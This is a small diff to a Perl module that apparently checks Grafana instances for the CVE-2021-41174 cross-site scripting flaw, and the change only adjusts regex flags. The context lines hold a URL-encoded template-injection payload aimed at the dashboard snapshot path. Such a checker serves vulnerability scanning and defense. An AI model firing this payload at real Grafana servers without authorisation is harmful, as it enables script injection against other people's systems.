@@ -14,7 +14,7 @@ package Spellbook::Advisory::CVE_2021_41174 {
         );
 
         if ($target) {
-            if ($target !~ /^http(s)?:\/\//x) { 
+            if ($target !~ /^http(s)?:\/\//msx) { 
                 $target = "https://$target";
             }
 
@@ -22,7 +22,7 @@ package Spellbook::Advisory::CVE_2021_41174 {
             $snapshot_path = "dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1";
             my $request = $useragent -> get ("$target/$snapshot_path");
 
-            if (($request -> code() == 200) && ($request -> content() =~ /Grafana/m)) {
+            if (($request -> code() == 200) && ($request -> content() =~ /Grafana/ms)) {
                 push @result, $target;
             }
 
